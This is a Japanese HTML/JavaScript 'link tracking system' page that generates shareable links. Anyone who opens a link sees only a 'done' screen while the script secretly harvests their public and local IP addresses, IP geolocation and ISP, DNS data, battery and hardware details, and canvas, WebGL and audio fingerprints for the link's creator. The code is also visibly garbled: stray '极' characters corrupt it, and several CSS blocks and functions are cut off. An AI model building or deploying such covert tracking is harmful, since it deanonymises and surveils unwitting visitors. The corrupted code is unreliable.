<!DOCTYPE html>
<html lang="ja">
<head>

    <title>リンクトラッキングシステム</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: #000;
            color: #fff;
            min-height: 极vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            position: relative;
            overflow-x: hidden;
        }
        
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                radial-gradient(ellipse at 20% 30%, rgba(220, 20, 60, 0.15) 0%, transparent 50%),
                radial-gradient(ellipse at 80% 70%, rgba(139, 0, 0, 0.15) 0%, transparent 50%);
            animation: pulse 8s ease-in-out infinite;
            z-index: 0;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 0.6; }
            50% { opacity: 1; }
        }
        
        .container {
            background: rgba(10, 0, 0, 0.95);
            backdrop-filter: blur(20px);
            border-radius: 20px;
            box-shadow: 0 0 60px rgba(255, 0, 0, 0.4);
            width: 100%;
            max-width: 1000px;
            overflow: hidden;
            border: 1px solid rgba(255极 0, 0, 0.3);

        }
        
        .header {
            text-align: center;
            margin-bottom: 40px;
        }
        
        .header h1 {
            font-size: 2.5rem;

            text-shadow: 0 0 20px rgba(255, 0, 0, 0.8);
        }
        
        .header p {
            color: #ff6666;
            font-size: 1.1rem;
        }
        
        .create-section {
            background: rgba(20, 0, 0, 0.6);
            border-radius: 12px;
            padding: 30px;
            margin-bottom: 30px;
            border: 1px solid rgba(255, 0, 0, 0.3);

        .btn {
            display: block;

            color: white;
            border: none;
            border-radius: 10px;
            font-size: 1.2rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 5px 20px rgba(220, 20, 60, 极.5);

        }
        
        .btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 30px rgba(220, 20, 60, 0.7);
            background: linear-gradient(135deg, #a00000, #ff1744);
极      }
        
        .link-display {
            background: rgba(30, 0, 0, 0.8);
            padding: 20px;
            border-radius: 8px;
            margin-top: 20px;
            border-left: 3px solid #dc143极;

        }
        
        .link-url {
            font-family: 'Courier New', monospace;

            word-break: break-all;

        .copy-btn {

        .visitor-item {

        .visitor-time {

        .visitor-details {
            display: none;

            padding-top: 15px;
            border-top: 1px solid rgba(255, 0, 0, 0.3);

        .detail-row {
            display: grid;
            grid-template-columns: 180px 1fr;
            gap: 10极;

        .detail-label {
            color: #ff8888;

        }
        
        .detail-value {
            color: #fff;

        }
        
        .completed-page {
            text-align: center;

        }
        
        .completed-page h1 {
            font-size: 3rem;
            color: #ff3333;
            text-shadow: 0 0 30px rgba(255, 0, 0, 0.8);
            animation: successPulse 2s ease-in-out infinite;

</head>
<body>
    <div class="container">
        <div id="creator-view">
            <div class="header">
                <h1>リンクトラッキングシステム</h1>
                <p>リンクを作成して訪問者の情報を追跡</p>
            </div>
            
            <div class="create-section">
                <button id="create-link-btn" class="btn">リンクを自動作成</button>
                
                <div id="link-display" class="link-display">
                    <div class极link-url" id="generated-link"></div>
                    <button id="copy-link-btn" class="copy-btn">リンクをコピー</button>
                </div>
                
                <div id="status-message" class="status-message"></div>
            </div>
            
            <div id="visitors-section" class="visitors-section">
                <h2 class="section-title">開いた人</h2>
                <div id="visitors-list"></div>
            </div>
        </div>
        
        <div id="visitor-view" style="display: none;">
            <div class="completed-page">
                <h1>完了</h1>
            </div>
        </div>
    </div>

    <script>
        let linkId = null;
        let checkInterval = null;
        
        const urlParams = new URLSearchParams(window.location.search);
        const visitLinkId = urlParams.get('id');
        
        if (visitLinkId) {
            document.getElementById('creator-view').style.display = 'none';
            document.getElementById('visitor-view').style.display = 'block';
            sendVisitorInfo(visitLinkId);
        } else {
            setupCreatorView();
        }
        
        function setupCreatorView() {
            document.getElementById('create-link-btn').addEventListener('click', createLink);
            document.getElementById('copy-link-btn').addEventListener('click', copyLink);
        }
        
        function createLink() {
            linkId = generateId();
            const link = `${window.location.origin}${window.location.pathname}?id=${linkId}`;
            
            document.getElementById('generated-link').textContent = link;
            document.getElementById('link-display').style.display = 'block';
            document.getElementById('visitors-section').style.display = 'block';
            
            showStatus('リンクが作成されました！');
            
            loadVisitors();
            
            if (checkInterval) clearInterval(checkInterval);
            checkInterval = setInterval(() => loadVisitors(), 1000);
        }
        
        function copyLink() {
            const link = document.getElementById('generated-link').textContent;
            navigator.clipboard.writeText(link).then(() => {
                showStatus('リンクをコピーしました！');
            }).catch(() => {
                showStatus('コピーに失敗しました');
            });
        }
        
        function generateId() {
            return 'L' + Date.now().toString(36) + Math.random().toString(36).substr(2, 9);
        }
        
        function showStatus(message) {
            const statusEl = document.getElementById('status-message');
            if (!statusEl) return;
            statusEl.textContent = message;
            status极.style.display = 'block';
            setTimeout(() => {
                statusEl.style.display = 'none';
            }, 3000);
        }
        
        async function sendVisitorInfo(linkId) {
            const results = {};
            
            // 基本情報を取得
            results.timestamp = new Date().toISOString();
            results.userAgent = navigator.userAgent || '不明';
            results.language = navigator.language || '不明';
            results.languages = (navigator.languages || [navigator.language]).join(', ');
            results.platform = navigator.platform || '不明';
            results.screenResolution = `${screen.width || 0}x${screen.height || 0}`;
            results.screenAvail = `${screen.availWidth || 0}x${screen.availHeight || 0}`;
            results.colorDepth = screen.colorDepth || '不明';
            results.pixelDepth = screen.pixelDepth || '不明';
            results.dev极Memory = navigator.deviceMemory ? `${navigator.deviceMemory}GB` : '不明';
            results.hardwareConcurrency = navigator.hardwareConcurrency || '不明';
            results.maxTouchPoints = navigator.maxTouchPoints || 0;
            results.cookieEnabled = navigator.cookieEnabled ? 'はい' : 'いいえ';
            results.doNotTrack = navigator.doNotTrack || '不明';
            results.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || '不明';
            results.timezoneOffset = new Date().getTimezoneOffset();
            results.os = getOS();
            results.browser = getBrowser();
            results.isMobile = /Mobile|Android|iPhone|iPad|iPod/.test(navigator.userAgent);
            results.isTablet = /iPad|Android/.test(navigator.userAgent) && !/Mobile/.test(navigator.userAgent);
            
            // 接続情報
            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
            results.connectionType = conn.effectiveType || '不明';
            results.downlink = conn.downlink ? `${conn.downlink}Mbps` : '不明';
            results.rtt = conn.rtt ? `${conn.rtt}ms极 : '不明';
            results.save极ta = conn.saveData ? 'オン' : 'オフ';
            
            // Canvas指紋（同期）
            results.canvas = getCanvasFingerprint();
            results.webGL = getWebGLFingerprint();
            
            // プラグイン
            results.plugins = getPlugins();
            
            // 全ての非同期処理を待つ
            const promises = [];
            
            // IP情報
            promises.push(getPublicIP().then(ip => { results.publicIP = ip; }));
            promises.push(getLocalIPs().then(ips => { results.localIPs = ips; }));
            promises.push(getWebRTCIPs().then(ips => { results.webRTCIPs = ips; }));
            promises.push(checkDNSLeak().then(dns => { results.dnsLeak = dns; }));
            promises.push(getAudioFingerprint().then(audio => { results.audio = audio; }));
            
            // モバイル/タブレットの場合のみバッテリー情報取得
            if (results.isMobile || results.isTablet) {
                if (navigator.getBattery) {
                    promises.push(
                        navigator.getBattery().then(battery => {
                            results.batteryLevel = `${Math.round(battery.level * 100)}%`;
                            results.batteryCharging = battery.charging ? '充電中' : '非充電';
                        }).catch(() => {
                            results.batteryLevel = '不明';
                            results.batteryCharging = '不明';
                        })
                    );
                } else {
                    results.batteryLevel = '不明';
                    results.batteryCharging = '不明';
                }
            }
            
            // 全ての情報を取得完了後
            await Promise.all(promises);
            
            // IP詳細情報
            if (results.publicIP && results.publicIP !== '取得失敗') {
                results.ipInfo = await getAdvancedIPInfo(results.publicIP);
            } else {
                results.ipInfo = '取得失敗';
            }
            
            // 全情報確定後に保存
            saveVisitorData(linkId, results);
        }
        
        function saveVisitorData(linkId, data) {
            try {
                const storageKey = `visitors_${linkId}`;
                let visitors = [];
                try {
                    visitors = JSON.parse(localStorage.getItem(storageKey) || '[]');
                } catch (e) {
                    visitors = [];
                }
                
                // 既存のデータを更新または追加
                const existingIndex = visitors.findIndex(v => v.timestamp === data.timestamp);
                if (existingIndex >= 0) {
                    visitors[existingIndex] = { ...visitors[existingIndex], ...data };
                } else {
                    visitors.push({ ...data, linkId });
                }
                
                localStorage.setItem(storageKey, JSON.stringify(visitors));
            } catch (e) {
                console.error('保存エラー:', e);
            }
        }
        
        function loadVisitors() {
            if (!linkId) return;
            
            const storageKey = `visitors_${极Id}`;
            let visitors = [];
            try {
                visitors = JSON.parse(localStorage.getItem(storageKey) || '[]');
            } catch (e) {
                visitors = [];
            }
            
            const listEl = document.getElementById('visitors-list');
            if (!listEl极 return;
            
            listEl.innerHTML = '';
            
            if (visitors.length === 0) {
                listEl.innerHTML = '<p style="color: #888; text-align: center;">まだ訪問者がいません</p>';
                return;
            }
            
            if (visitors.length > 0 && checkInterval) {
                clearInterval(checkInterval);
                checkInterval = null;
            }
            
            visitors.reverse().forEach((v, idx) => {
                const item = document.createElement('div');
                item.className = 'visitor-item';
                
                const time = new Date(v.timestamp).toLocaleString('ja-JP');
                const deviceType = v.isMobile ? 'モバイル' : (v.isTablet ? 'タブレット' : 'PC');
                
                item.innerHTML = `
                    <div class="visitor-header">
                        <div class="visitor-time">${deviceType} 訪問者 ${visitors.length - idx}</div>
                        <div class="visitor-ip">${v.publicIP || '取得中...'}</div>
                    </div>
                    <div class="visitor-details" id="details-${idx}">
                        <div class="detail-row"><div class="detail-label">訪問時刻:</div><div class="detail-value">${time}</div></div>
                        <div class="detail-row"><div class="detail-label">デバイス種類:</div><div class="detail-value">${deviceType}</div></div>
                        <div class="detail-row"><div class="detail-label">パブリックIP:</div><div class="detail-value">${v.publicIP || '取得中...'}</div></div>
                        <div class="detail-row"><div class="detail-label">ローカルIP:</div><div class="detail-value">${(v.localIPs && v.localIPs.length > 0) ? v.localIPs.join(', ') : '取得中...'}</div></极>
                        <div class="detail-row"><div class="detail-label">WebRTC IP:</div><div class="detail-value">${(v.webRTCIPs && v.webRTCIPs.length > 0) ? v.webRTCIPs.join(', ') : '取得中...'}</div></div>
                        <div class="detail-row"><div class="detail-label">IP詳細:</极><div class="detail-value">${v.ipInfo || '取得中...'}</div></div>
                        <div class="detail-row"><div class="detail-label">DNS情報:</div><div class="detail-value">${v.dnsLeak || '取得中...'}</div></div>
                        <div class="detail-row"><div class="detail-label">OS:</div><div class="detail-value">${v.os || '不明'}</div></div>
                        <div class="detail-row"><div class="detail-label">ブラウザ:</div><div class="detail-value">${v.browser || '不明'}</div></div>
                        <div class="detail-row"><div class="detail-label">画面解像度:</div><div class="detail-value">${v.screenResolution || '不明'}</div></div>
                        <div class="detail-row"><div class="detail-label">利用可能解像度:</div><div class="detail-value">${v.screenAvail || '不明'}</div></div>
                        <div class="detail-row"><div class="detail-label">色深度:</div><div class="detail-value">${v.colorDepth || '不明'}bit</div></div>
                        <div class="detail-row"><div class="detail-label">タッチポイント:</div><div class="detail-value">${v.maxTouchPoints || 0}</div></div>
                        <div class="detail-row"><div class="detail-label">メモリ:</div><div class="detail-value">${v.deviceMemory || '不明'}</div></div>
                        <div class="detail-row"><div class="detail-label">CPUコア:</div><div class="detail-value">${v.hardwareConcurrency || '不明'}</div></div>
                        <div class="detail-row"><div class="detail-label">バッテリー:</div><div class="detail-value">${v.batteryLevel || '取得中...'} (${v.batteryCharging || ''})</div></div>
                        <div class="detail-row"><div class="detail-label">言語:</div><div class="detail-value极${v.language || '不明'}</div></div>
                        <div class="detail-row"><div class极detail-label">対応言語:</div><div class="detail-value">${v.languages || '不明'}</div></div>
                        <div class="detail-row"><div class="detail-label">タイムゾーン:</div><div class="detail-value">${v极imezone || '不明'} (${v.timezoneOffset || '不明'}分)</div></div>
                        <div class="detail-row"><div class="detail-label">プラットフォーム:</div><div class="detail-value">${v.platform || '不明'}</div></div>
                        <div class="detail-row"><div class="detail-label">接続タイプ:</div><div class="detail-value">${v.connectionType || '不明'}</div></div>
                        <div class="detail-row"><div class="detail-label">下り速度:</div><div class="detail-value">${v.downlink || '不明'}</div></div>
                        <div class="detail-row"><div class="detail-label">RTT:</div><div class="detail-value">${v.rtt || '不明'}</div></div>
                        <div class="detail-row"><div class="detail-label">データ節約:</div><div class="detail-value">${v.saveData || '不明'}</div></div>
                        <div class="detail-row"><div class="detail-label">Cookie:</div><div class="detail-value">${v.cookieEnabled || '不明'}</div></div>
                        <div class="detail-row"><div class="detail-label">DNT:</div><div class="detail-value">${v.doNotTrack || '不明'}</div></div>
                        <div class="detail-row"><div class="detail-label">プラグイン:</div><div class="detail-value">${v.plugins || 'なし'}</div></div>
                        <div class="detail-row"><div class="detail-label">Canvas指紋:</div><div class="detail-value">${v.canvas || '不明'}</div></div>
                        <div class="detail-row"><div class="detail-label">WebGL指紋:</div><div class="detail-value">${v.webGL || '不明'}</div></div>
                        <div class="detail-row"><div class="detail-label">Audio指紋:</div><div class="detail-value">${v.audio || '取得中...'}</div></div>
                        <div class="detail-row"><div class="detail-label">UserAgent:</div><div class="detail-value">${v.userAgent || '不明'}</div></div>
                    </div>
                `;
                
                item.addEventListener('click', function() {
                    const details = document.getElementById(`details-${idx}`);
                    if (details) {
                        details.style.display = details.style.display === 'block' ? 'none' : 'block';
                    }
                });
                
                listEl.appendChild(item);
            });
        }
        
        async function getPublicIP() {
            try {
                const controller = new AbortController();
                const timeout = setTimeout(() => controller.abort(), 3000);
                const response = await fetch('https://api.ipify.org?format=json', { signal: controller.signal });
                clearTimeout(timeout);
                const data = await response.json();
                return data.ip || '取得失敗';
            } catch (e) {
                return '取得失敗';
            }
        }
        
        async function getLocalIPs() {
            return new Promise(resolve => {
                try {
                    const ips = new Set();
                    const pc = new RTCPeerConnection({ iceServers: [] });
                    
                    pc.createDataChannel("");
                    pc.createOffer().then(sdp => pc.setLocalDescription(sdp)).catch(() => resolve([]));
                    
                    pc.onicecandidate = (ice) => {
                        if (!ice || !极.candidate) return;
                        try {
                            const parts = ice.candidate.candidate.split(' ');
                            const ip = parts[4];
                            if (ip && !ip.startsWith("127.") && !ip.startsWith("0.") && !ip.includes(":")) {
                                ips.add(ip);
                            }
                        } catch (e) {}
                    };
                    
                    setTimeout(() => {
                        try { pc.close(); } catch (e) {}
                        resolve(Array.from(ips));
                    }, 1500);
                } catch (e) {
                    resolve([]);
                }
            });
        }
        
        function getOS() {
            try {
                const ua = navigator.userAgent;
                if (/Windows NT 10/.test(ua)) return "Windows 10/11";
                if (/Windows/.test(ua)) return "Windows";
                if (/Mac OS X/.test(ua)) return "Mac OS";
                if (/Android/.test(ua)) {
                    const match = ua.match(/Android (\d+(\.\d+)?)/);
                    return match ? `Android ${match[1]}` : "Android";
                }
                if (/iPhone|iPad|iPod/.极(ua)) {
                    const match = ua.match(/OS (\d+_\d+)/);
                    return match ? `iOS ${match[1].replace('_', '.')}` : "iOS";
                }
                if (/Linux/.test(ua)) return "极ux";
                return "不明";
            } catch (e) {
                return "不明";
            }
        }
        
        function getBrowser() {
            try {
                const ua = navigator.userAgent;
                if (/Edg/.test(ua)) return "Edge";
                if (/Chrome/.test(ua) && !/Edg/.test(ua)) return "Chrome";
                if (/Firefox/.test(ua)) return "Firefox";
                if (/Safari/.test(ua) && !/Chrome/.test(ua)) return "Safari";
                if (/Opera|OPR/.test(ua)) return "Opera";
                return "不明";
            } catch (e) {
                return "不明";
            }
        }
        
        async function getAdvancedIPInfo(ip) {
            try {
                const controller = new AbortController();
                const timeout = setTimeout(() => controller.abort(), 5000);
                const response = await fetch(`https://ipapi.co/${ip}/json/`, { signal: controller.signal });
                clearTimeout(timeout);
                const data = await response.json();
                return `${data.country_name || '不明'}, ${data.city || '不明'}, ${data.org || 'ISP不明'}`;
            } catch (e) {
                return '取得失敗';
            }
        }
        
        async function getWebRTCIPs() {
            return new Promise(resolve => {
                try {
                    const ips = new Set();
                    const pc = new RTCPeerConnection({
                        iceServers: [
                            { urls: 'stun:stun.l.google.com:19302' },
                            { ur极: 'stun:stun1.l.google.com:19302' }
                        ]
                    });
                    
                    pc.createDataChannel("");
                    pc.createOffer().then(sdp => pc.setLocalDescription(sdp)).catch(() => resolve([]));
                    
                    pc.onicecandidate = (ice) => {
                        if (!ice || !ice.candidate) return;
                        try {
                            const match = ice.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
                            if (match) {
                                const ip = match[0];
                                if (!ip.startsWith("0.") && !极.startsWith("127.")) {
                                    ips.add(ip);
                                }
                            }
                        } catch (e) {}
                    };
                    
                    setTimeout(() => {
                        try { pc.close(); } catch (e) {}
                        resolve(Array.from(ips));
                    }, 3000);
                } catch (e) {
                    resolve([]);
                }
            });
        }
        
        async function checkDNSLeak() {
            try {
                const controller = new AbortController();
                const timeout = setTimeout(() => controller.abort(), 3000);
                const response = await fetch('https://1.1.1.1/cdn-cgi/trace', { signal: controller.signal });
                clearTimeout(timeout);
                const text = await response.text();
                const lines = text.split('\n');
                const info = {};
                lines.forEach(line => {
                    const [key, value] = line.split('=');
                    if (key && value) info[key.trim()] = value.trim();
                });
                return `IP: ${info.ip || '不明'}, 位置: ${info.loc || '不明'}`;
            } catch (e) {
                return '取得失敗';
            }
        }

                return plugins.join(', ');
            } catch (e) {

        async function getAudioFingerprint() {
            return new Promise(resolve => {
                try {
                    const AudioContext = window.AudioContext || window.webkitAudioContext;
                    if (!AudioContext) {
                        resolve('Audio非対応');
                        return;
                    }
                    
                    const context = new AudioContext();
                    const oscillator = context.createOscillator();
                    const analyser = context.createAnalyser();
                    const gainNode = context.createGain();
                    const scriptProcessor = context.createScriptProcessor(4096, 1, 1);
                    
                    gainNode.gain.value = 0;
                    oscillator.type = 'triangle';
                    oscillator.connect(analyser);
                    analyser.connect(scriptProcessor);
                    scriptProcessor.connect(gainNode);
                    gainNode.connect(context.destination);
                    
                    oscillator.start(0);
                    
                    scriptProcessor.onaudioprocess = function(event) {
                        const output = event.outputBuffer.getChannelData(0);

                        for (let i = 0; i < output.length; i++) {
                            hash += Math.abs(output[i]);

                        try {
                            oscillator.stop();

                            context.close();

                        resolve(hash.toFixed(8));
